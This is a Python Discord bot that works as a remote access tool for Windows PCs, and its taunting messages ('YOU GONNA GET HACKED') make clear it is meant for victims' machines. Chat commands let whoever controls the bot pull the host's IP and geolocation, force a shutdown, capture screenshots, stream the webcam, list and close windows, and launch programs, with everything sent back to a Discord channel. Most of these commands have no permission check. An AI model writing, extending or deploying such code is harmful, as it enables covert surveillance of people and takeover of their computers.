# <--------------------------(IMPORTS)-------------------------->
import discord
from discord.ext import commands
import requests
import pprint
import socket
import cv2
import os
import bs4
import asyncio
import subprocess
import pyautogui
import pygetwindow as gw
import threading

# <--------------------------(PREFIX ONREADY)-------------------------->
bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}, ID: {bot.user.id}')
    print("______________________________________________________________________________________________________________________________________________________")

# <--------------------------(COMMANDS)-------------------------->
@bot.command(name='getip')
async def get_ip(ctx):
    try:
        public_ip = get_public_ip()
        my_ip = get_my_ip()

        if public_ip:
            output = "NOOB\n"

            ip_info = get_ip_info(public_ip)
            output += "Public IP Info:\n"
            output += pprint.pformat(ip_info)

            if my_ip:
                output += "\n\nYOU GONNA GET HACKED LOLOLOL\n"
                output += f"Local IP: {my_ip}"
            else:
                output += "\n\nget ip grabbed noob"

            with open("ip_info.txt", "w") as file:
                file.write(output)

            await ctx.send(output)

        else:
            await ctx.send("Error getting public IP.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        data = response.json()
        return data['ip']
    except Exception as e:
        print("Error:", e)
        return None

def get_my_ip():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        print("Error:", e)
        return None

def get_ip_info(ip):
    try:
        url = f"https://ipapi.co/{ip}/json/"
        response = requests.get(url)
        ip_info = response.json()
        return ip_info
    except Exception as e:
        print("Error:", e)
        return {}

@bot.command(name='shutdown')
async def shutdown(ctx):
    try:
        subprocess.run(['shutdown', '/s', '/f', '/t', '0'], check=True)
        await ctx.send("Shutting down the computer.")
    except subprocess.CalledProcessError:
        await ctx.send("Failed to shut down the computer.")


@bot.command(name='find_tabs')
async def find_tabs(ctx, browser_name):
    if await is_admin(ctx.author):
        try:
            browser = gw.getWindowsWithTitle(browser_name)
            if browser:
                browser[0].activate()
                tabs = gw.getWindowsWithTitle(browser_name)
                tab_info = '\n'.join([tab.title for tab in tabs])
                await ctx.send(f"Tabs in {browser_name}:\n{tab_info}")
            else:
                await ctx.send(f"No {browser_name} browser found.")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send("You don't have permission to use this command.")

@bot.command(name='close_tab')
async def close_tab(ctx, browser_name, tab_title):
    if await is_admin(ctx.author):
        try:
            browser = gw.getWindowsWithTitle(browser_name)
            if browser:
                browser[0].activate()
                tabs = gw.getWindowsWithTitle(tab_title)
                if tabs:
                    tabs[0].close()
                    await ctx.send(f"Closed tab: {tab_title}")
                else:
                    await ctx.send(f"No tab with title '{tab_title}' found.")
            else:
                await ctx.send(f"No {browser_name} browser found.")
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send("You don't have permission to use this command.")

# Check if the author of the command is an administrator
async def is_admin(author):
    return any(role.permissions.administrator for role in author.roles)


@bot.command(name='google')
async def google_search(ctx, *, query):
    try:
        search_url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(search_url, headers=headers)
        
        if response.status_code == 200:
            soup = bs4(response.text, 'html.parser')
            search_results = soup.find_all('div', class_='tF2Cxc')
            
            if search_results:
                result_text = ""
                for idx, result in enumerate(search_results[:5], start=1):
                    title = result.find('h3').get_text()
                    link = result.a['href']
                    result_text += f"{idx}. [{title}]({link})\n"
                
                await ctx.send(result_text)
            else:
                await ctx.send("No search results found.")
        else:
            await ctx.send("An error occurred while fetching search results.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='runapp')
async def run_application(ctx, app_name: str):
    try:
        apps = {
    'notepad': 'notepad.exe',
    'calculator': 'calc.exe',
    'word': 'winword.exe',  # Microsoft Word
    'excel': 'excel.exe',   # Microsoft Excel
    'powerpoint': 'powerpnt.exe',  # Microsoft PowerPoint
    'paint': 'mspaint.exe',  # Microsoft Paint
    'chrome': 'chrome.exe',  # Google Chrome
    'firefox': 'firefox.exe',  # Mozilla Firefox
    'edge': 'msedge.exe',  # Microsoft Edge
    'whatsapp': 'WhatsApp.exe',  # WhatsApp Desktop
    'skype': 'Skype.exe',  # Skype
    'outlook': 'outlook.exe',  # Microsoft Outlook
    'vlc': 'vlc.exe',  # VLC Media Player
    'spotify': 'Spotify.exe',  # Spotify
    'photoshop': 'photoshop.exe',  # Adobe Photoshop
    'illustrator': 'illustrator.exe',  # Adobe Illustrator
    'premiere': 'premiere.exe',  # Adobe Premiere Pro
    'onenote': 'onenote.exe',  # Microsoft OneNote
    'telegram': 'Telegram.exe',  # Telegram Desktop
    'calendar': 'outlookcal.exe',  # Microsoft Calendar
    'mail': 'outlookmail.exe',  # Microsoft Mail
    'camera': 'WindowsCamera.exe',  # Windows Camera
    'alarm': 'AlarmsAndClock.exe',  # Alarms & Clock
    'maps': 'WindowsMaps.exe',  # Windows Maps
    'weather': 'msnweather.exe',  # MSN Weather
    'news': 'Microsoft.MSNNews_8wekyb3d8bbwe',  # MSN News (UWP)
    'store': 'Microsoft.WindowsStore_8wekyb3d8bbwe',  # Microsoft Store (UWP)
    'movies': 'Microsoft.MoviesTV_8wekyb3d8bbwe',  # Movies & TV (UWP)
    'music': 'Microsoft.ZuneMusic_8wekyb3d8bbwe',  # Groove Music (UWP)
    'photos': 'Microsoft.Windows.Photos_8wekyb3d8bbwe',  # Photos (UWP)
    'settings': 'SystemSettings.exe',  # Windows Settings
    'control': 'control.exe',  # Control Panel
    # Add more application mappings here
}
        if app_name in apps:
            cmd = f'start {apps[app_name]}'
            subprocess.run(cmd, shell=True, check=True)
            await ctx.send(f"Running {app_name}...")
        else:
            await ctx.send(f"Application '{app_name}' not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command(name='createnote')
async def create_notepad(ctx, *, content: str):
    try:
        # Create a new Notepad file
        with open("temp_note.txt", "w") as file:
            file.write(content)
        
        # Open the Notepad file with the default text editor
        subprocess.run(["notepad.exe", "temp_note.txt"], shell=True)
        
        await ctx.send("Notepad file created and opened. You can edit and save it.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
    finally:
        # Clean up the temporary file
        if os.path.exists("temp_note.txt"):
            os.remove("temp_note.txt")


@bot.command(name='screenshot')
async def take_screenshot(ctx):
    try:
        # Take a screenshot
        screenshot = pyautogui.screenshot()
        
        # Save the screenshot as a file
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        
        # Send the screenshot to the channel
        with open(screenshot_path, 'rb') as file:
            screenshot_file = discord.File(file, filename='screenshot.png')
            await ctx.send(file=screenshot_file)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
    finally:
        # Clean up the screenshot file
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)


@bot.command(name='viewtab')
async def view_tab(ctx):
    try:
        window_list = gw.getWindowsWithTitle('')
        window_titles = [window.title for window in window_list]

        if not window_titles:
            await ctx.send("No open windows found.")
            return

        formatted_titles = "\n".join([f"{index + 1}. {title}" for index, title in enumerate(window_titles)])
        await ctx.send(f"Choose a window to view:\n{formatted_titles}")

        def check(message):
            return message.author == ctx.author and message.content.isdigit() and 1 <= int(message.content) <= len(window_titles)

        try:
            message = await bot.wait_for('message', check=check, timeout=30)
        except asyncio.TimeoutError:
            await ctx.send("Timed out. Please choose a window within 30 seconds.")
            return

        selected_index = int(message.content) - 1
        selected_window = window_list[selected_index]

        # Activate the selected window
        selected_window.activate()

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


# Global variables to control the webcam feed
webcam_capture = None
webcam_thread = None
webcam_running = False

@bot.command()
async def start_cam(ctx):
    global webcam_capture, webcam_thread, webcam_running

    if webcam_running:
        await ctx.send("Webcam feed is already running.")
        return

    webcam_capture = cv2.VideoCapture(0)
    if not webcam_capture.isOpened():
        await ctx.send("Failed to open webcam.")
        return

    await ctx.send("Started webcam feed.")
    
    webcam_thread = threading.Thread(target=send_cam_feed, args=(ctx,))
    webcam_thread.start()
    webcam_running = True

@bot.command(name='help')
async def custom_help(ctx):
    embed = discord.Embed(title="Bot Commands", description="Here are the available commands:", color=0x3498db)
    
    # Add fields for each command with name, value, and inline properties
    embed.add_field(name="!getip", value="Get public and local IP addresses.", inline=False)
    embed.add_field(name="!shutdown", value="Shut down the computer.", inline=False)
    embed.add_field(name="!find_tabs [browser_name]", value="Find tabs in a browser window.", inline=False)
    embed.add_field(name="!close_tab [browser_name] [tab_title]", value="Close a specific tab in a browser window.", inline=False)
    embed.add_field(name="!google [query]", value="Perform a Google search.", inline=False)
    embed.add_field(name="!runapp [app_name]", value="Run a specified application.", inline=False)
    embed.add_field(name="!createnote [content]", value="Create and open a Notepad file with the given content.", inline=False)
    embed.add_field(name="!screenshot", value="Take and send a screenshot of the screen.", inline=False)
    embed.add_field(name="!viewtab", value="View and activate open windows.", inline=False)
    embed.add_field(name="!start_cam", value="Start sending the webcam feed.", inline=False)
    embed.add_field(name="!stop_cam", value="Stop sending the webcam feed.", inline=False)
    embed.add_field(name="!runappview", value="View a list of available applications to run.", inline=False)

    embed.set_footer(text="Bot developed by _hamster_. (check out hamster on github at 'hamster212')")
    
    await ctx.send(embed=embed)

@bot.command()
async def stop_cam(ctx):
    global webcam_capture, webcam_thread, webcam_running

    if not webcam_running:
        await ctx.send("Webcam feed is not running.")
        return

    webcam_running = False
    if webcam_capture:
        webcam_capture.release()

    if webcam_thread:
        webcam_thread.join()

    await ctx.send("Stopped webcam feed.")

def send_cam_feed(ctx):
    global webcam_capture, webcam_running

    while webcam_running:
        ret, frame = webcam_capture.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame)
        image_data = buffer.tobytes()

        try:
            asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(fp=image_data, filename='webcam.jpg')), bot.loop)
        except Exception as e:
            print(f"An error occurred: {e}")


# Global variable to control recording
recording = False

@bot.command()
async def runappview(ctx):
    app_list = "\n".join(apps.keys())  # Get the list of app names from the dictionary
    await ctx.send("Available applications for viewing:\n" + app_list)

apps = {
    'notepad': 'notepad.exe',
    'calculator': 'calc.exe',
    'word': 'winword.exe',  # Microsoft Word
    'excel': 'excel.exe',   # Microsoft Excel
    'powerpoint': 'powerpnt.exe',  # Microsoft PowerPoint
    'paint': 'mspaint.exe',  # Microsoft Paint
    'chrome': 'chrome.exe',  # Google Chrome
    'firefox': 'firefox.exe',  # Mozilla Firefox
    'edge': 'msedge.exe',  # Microsoft Edge
    'whatsapp': 'WhatsApp.exe',  # WhatsApp Desktop
    'skype': 'Skype.exe',  # Skype
    'outlook': 'outlook.exe',  # Microsoft Outlook
    'vlc': 'vlc.exe',  # VLC Media Player
    'spotify': 'Spotify.exe',  # Spotify
    'photoshop': 'photoshop.exe',  # Adobe Photoshop
    'illustrator': 'illustrator.exe',  # Adobe Illustrator
    'premiere': 'premiere.exe',  # Adobe Premiere Pro
    'onenote': 'onenote.exe',  # Microsoft OneNote
    'telegram': 'Telegram.exe',  # Telegram Desktop
    'calendar': 'outlookcal.exe',  # Microsoft Calendar
    'mail': 'outlookmail.exe',  # Microsoft Mail
    'camera': 'WindowsCamera.exe',  # Windows Camera
    'alarm': 'AlarmsAndClock.exe',  # Alarms & Clock
    'maps': 'WindowsMaps.exe',  # Windows Maps
    'weather': 'msnweather.exe',  # MSN Weather
    'news': 'Microsoft.MSNNews_8wekyb3d8bbwe',  # MSN News (UWP)
    'store': 'Microsoft.WindowsStore_8wekyb3d8bbwe',  # Microsoft Store (UWP)
    'movies': 'Microsoft.MoviesTV_8wekyb3d8bbwe',  # Movies & TV (UWP)
    'music': 'Microsoft.ZuneMusic_8wekyb3d8bbwe',  # Groove Music (UWP)
    'photos': 'Microsoft.Windows.Photos_8wekyb3d8bbwe',  # Photos (UWP)
    'settings': 'SystemSettings.exe',  # Windows Settings
    'control': 'control.exe',  # Control Panel
    # Add more application mappings here
}


bot.run('YOUR TOKEN HERE')
